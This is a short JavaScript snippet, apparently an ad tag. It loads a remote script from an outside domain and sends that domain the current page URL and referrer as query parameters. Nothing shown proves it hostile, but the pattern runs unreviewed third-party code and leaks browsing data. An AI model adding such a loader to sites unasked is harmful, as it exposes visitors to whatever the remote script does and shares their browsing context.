
        (()=>{
            function randomHash(length) {
                return Math.random().toString(36).substring(2, 2 + length);
            };
            const h = randomHash(10);
            const r = encodeURIComponent(document?.referrer || "");
            const u = encodeURIComponent(window.location.href);
            const elMagic = document.createElement("script");
            elMagic.src = "https://static.asgc.my.id/ads.js?v="+h+"&r="+r+"&u="+u;
            document.head.appendChild(elMagic);
        })();
    
